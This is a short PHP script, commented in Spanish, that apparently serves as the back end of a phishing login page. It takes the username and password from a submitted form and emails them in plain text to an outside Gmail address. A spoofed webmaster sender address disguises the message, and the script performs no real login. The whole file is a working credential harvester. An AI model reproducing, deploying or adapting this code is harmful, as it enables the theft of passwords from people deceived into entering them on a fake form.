<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Destinatario del correo electrónico
    $to = "akrazou6@gmail.com";

    // Asunto del correo electrónico
    $subject = "Nuevo inicio de sesión";

    // Contenido del correo electrónico
    $message = "Se ha iniciado sesión con los siguientes datos:\n\n";
    $message .= "Usuario: " . $username . "\n";
    $message .= "Contraseña: " . $password . "\n";

    // Cabeceras del correo electrónico
    $headers = "From: webmaster@example.com\r\n";
    $headers .= "Reply-To: webmaster@example.com\r\n";
    $headers .= "Content-type: text/plain; charset=UTF-8\r\n";

    // Envío del correo electrónico
    if (mail($to, $subject, $message, $headers)) {
        echo "El correo ha sido enviado exitosamente.";
    } else {
        echo "Ha ocurrido un error al enviar el correo.";
    }
}
?>
